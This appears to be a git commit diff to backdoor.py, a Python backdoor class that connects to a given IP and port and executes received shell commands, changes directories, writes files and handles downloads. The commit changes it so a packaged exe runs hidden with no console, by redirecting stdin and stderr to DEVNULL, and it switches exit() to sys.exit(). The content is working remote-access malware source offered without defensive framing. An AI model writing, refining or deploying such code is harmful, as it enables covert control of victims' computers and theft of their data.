d5d7d209a2f69e3881e2b4253f9e42014defebe6
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-10 17:42:37 +0530

    Running exe file without cmd

--- backdoor.py
+++ backdoor.py
@@ -5,6 +5,7 @@ import subprocess
 import json
 import os
 import base64
+import sys
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -30,7 +31,8 @@ class Backdoor:
         return "[+] Changing working directory to " + path
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+       # DEVNULL = open(os.devnull, 'wb') for python 2
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin= subprocess.DEVNULL)   # To handle standard input and error when running exe file with noconsole for python 3
 
     def write_file(self, path, content):
         with open(path , "wb") as file:
@@ -47,7 +49,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_working_directory_to(command[1])
                 elif command[0] == "download":
